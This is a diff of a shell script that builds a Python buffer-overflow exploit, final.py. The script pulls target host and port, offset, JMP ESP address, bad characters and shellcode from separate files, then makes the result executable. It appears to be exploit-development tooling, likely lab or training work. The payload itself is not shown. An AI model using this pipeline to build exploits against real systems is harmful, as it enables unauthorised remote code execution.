@@ -8,18 +8,25 @@ EOF
 
 echo "" >> ./final.py
 
+cat ./config.py | grep "RHOST =" >> ./final.py
+cat ./config.py | grep "RPORT =" >> ./final.py
+
+echo "" >> ./final.py
+
 cat ./config.py | grep "def connect" -A1000 >> ./final.py
 
 echo "" >> ./final.py
 
-cat ./config.py | grep "BUFT" >> ./final.py
-cat ./config.py | grep "OFFSET" >> ./final.py
-cat ./config.py | grep "NO_Z" >> ./final.py
-cat ./config.py | grep "JMPESP" >> ./final.py
-cat ./config.py | grep "SUBESP" >> ./final.py
+cat ./config.py | grep "BUFT =" >> ./final.py
+cat ./config.py | grep "OFFSET =" >> ./final.py
+cat ./config.py | grep "NO_Z =" >> ./final.py
+cat ./config.py | grep "JMPESP =" >> ./final.py
+cat ./config.py | grep "SUBESP =" >> ./final.py
 
 echo "" >> ./final.py
 
+echo -n "# " >> final.py
+cat ./config.py | grep "BADCHARS = " >> ./final.py
 cat ./shellcode.py >> ./final.py
 
 echo "" >> ./final.py
@@ -28,3 +35,4 @@ echo 'SHELLCODE = shellcode' >> ./final.py
 
 cat 8_exploit.py | tail -n 10 >> ./final.py
 
+chmod +x ./final.py
